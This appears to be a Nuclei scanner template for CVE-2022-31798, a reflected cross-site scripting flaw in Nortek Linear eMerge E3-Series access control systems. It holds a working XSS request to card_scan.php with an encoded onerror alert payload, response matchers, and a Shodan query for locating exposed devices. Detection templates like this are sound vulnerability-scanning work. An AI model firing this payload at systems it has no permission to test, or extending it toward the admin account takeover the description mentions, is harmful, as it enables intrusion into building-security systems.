id: CVE-2022-31798
info:
  author: ritikchaddha
  classification:
    cve-id: CVE-2022-31798
  description: 'There is local session fixation that chained with reflected cross-site
    scripting leads to account take over of admin or less privileged users.

    '
  metadata:
    shodan-query: http.title:"eMerge"
    verified: 'true'
  name: Nortek Linear eMerge E3-Series - XSS
  reference:
  - https://packetstormsecurity.com/files/167992/
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-31798
  - http://packetstormsecurity.com/files/167992/Nortek-Linear-eMerge-E3-Series-Account-Takeover.html
  severity: high
  tags: cve2022,emerge,nortek,xss,packetstorm,cve
requests:
- matchers:
  - part: body
    type: word
    words:
    - ',"CardFormatNo":"<img src=x onerror=alert(document.domain)>"}'
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/card_scan.php?No=0000&ReaderNo=0000&CardFormatNo=%3Cimg%20src%3Dx%20onerror%3Dalert%28document.domain%29%3E'
